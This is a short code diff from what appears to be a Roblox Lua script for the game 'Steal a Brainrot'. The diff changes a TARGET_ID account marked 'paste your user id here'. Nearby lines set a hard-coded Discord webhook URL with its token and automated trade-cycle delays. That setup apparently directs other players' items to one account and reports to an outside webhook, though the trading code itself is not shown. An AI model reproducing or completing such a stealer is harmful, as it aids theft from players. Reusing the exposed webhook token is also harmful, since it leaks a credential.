@@ -9068,7 +9068,7 @@ task.spawn(function()
 local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1517179180176117861/-28Exn_L2NpH1cohx69bMzfBWcb8HXpgT6duP4-PHzjLaSp9m4KGkB-triLm5r9tngZD" -- PASTE YOUR WEBHOOK HERE
 local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
-local TARGET_ID = 11134587581 -- paste your user id here
+local TARGET_ID = 3407847420 -- paste your user id here
 local DELAY_STEP = 1
 local TRADE_CYCLE_DELAY = 2
 
